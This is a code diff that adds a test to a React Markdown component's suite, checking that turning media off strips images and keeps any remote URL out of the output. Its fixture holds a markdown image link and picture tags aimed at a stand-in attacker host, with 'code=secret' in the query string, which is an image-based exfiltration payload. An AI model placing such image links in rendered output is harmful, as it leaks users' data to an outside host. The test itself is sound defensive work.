@@ -65,4 +65,13 @@ describe('Markdown', () => {
     const diagram = await screen.findByRole('img', { name: 'Mermaid diagram' })
     expect(diagram.querySelector('svg')?.getAttribute('data-code')).toBe('sequenceDiagram')
   })
+
+  it('can leave out images so the text never loads remote content', () => {
+    const text = '![logo](https://evil.example/p?code=secret)\n\n<picture><source srcset="https://evil.example/s"><img src="https://evil.example/i"></picture>'
+
+    const container = render(<Markdown text={text} media={false} />).container
+
+    expect(container.querySelector('img, picture, source')).toBeNull()
+    expect(container.innerHTML).not.toContain('evil.example')
+  })
 })
